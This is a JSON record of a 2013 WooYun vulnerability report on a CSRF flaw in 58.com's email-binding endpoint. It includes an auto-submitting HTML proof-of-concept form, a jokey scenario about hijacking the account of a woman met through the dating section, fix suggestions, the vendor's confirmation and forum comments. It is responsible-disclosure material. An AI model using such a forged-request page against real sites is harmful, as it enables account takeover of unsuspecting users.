{"id": 14574, "wybug_id": "wooyun-2013-016839", "wybug_title": "猥琐思路再次搞定58同城交友妹子帐号", "wybug_corp": "58同城", "wybug_author": "风萧萧", "wybug_date": "2013-01-02 18:45", "wybug_open_date": "2013-02-16 18:46", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "搞笑有爱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-16：\t细节向公众公开  简要描述： 过节还发洞的都是屌丝啊 详细说明：  1.修改他人帐号密码是违法行为啊！我是好人不干坏事的，这里只是进行验证测试呢！首先登陆58同城站点：http://myl58.com，看到【安全设置】了么？准备对邮箱进行验证吧！\n\n2.填写好要绑定的邮箱，注意这时候设置下代理哦！\n\n3.将POST请求拦截并且取消发送，并且将这个POST请求构造一个POC页面，前面两个步骤就是这个作用咯！\n<html><body><form id=\"fengxiaoxiao\" name=\"fengxiaoxiao\" action=\"http://my.58.com/submit/authmail/\" method=\"POST\"><input type=\"text\" name=\"txtEmail\" value=\"*********@qq.com\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.fengxiaoxiao.submit();</script></body></html>\n   漏洞证明：  4.到了具体的应用场景了：你在58交友时，和一个妹子相谈甚欢，并且有意愿义结金兰。无意中在妹子登陆58的前提下，访问了上述poc页面。那么将成功绑定你设置好的邮箱！\n\n5.OK，点击上述链接。不仅绑定了妹子帐号，同时也登陆了其58同城平台。\n\n   修复方案：  我仔细考虑了下，有下面几个问题：1.CSRF没有做任何防范，当然其他地方也会存在；2.关键接口没有做用户验证，比如提示用户首先输入密码才可绑定邮箱或手机，哪怕设置一个图片验证码也可防止这种情况；3.礼物啊礼物，好久没收到了！来一个撒   版权声明：转载请注明来源 风萧萧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-01-04 18:19 厂商回复： 间接对用户安全造成影响，非常感谢报告漏洞，马上修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-02 18:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  岁岁有今日    \n     2013-01-02 18:57 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  有朝一日，日复一日！    \n     2013-01-02 19:38 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @cncert国家互联网应急中心 @xsser  两个好基友！    \n     2013-01-02 21:49 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  对妹子这么执著,我要是个妹子,我都要嫁给你这个专情挖洞的人了    \n     2013-01-04 21:18 |    \t\td3pT1 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 人法地，地法天，天法道，道法自然。)\t\t \n  ......妹子啊 我不淡定了    \n     2013-01-05 08:38 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  尼玛，这货一看就是光棍。。昨天我就顾着陪别人的媳妇过节了。。    \n     2013-01-05 14:26 |    \t\t神刀 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | www.shellsec.com内射那么牛，虾米没妹子？)\t\t \n  对妹子这么执著,我要是个妹子,我都要嫁给你这个专情挖洞的人了    \n     2013-02-16 20:01 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  有些加验证码的会把验证码返回回来直接js验证，很多设计太奇葩    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}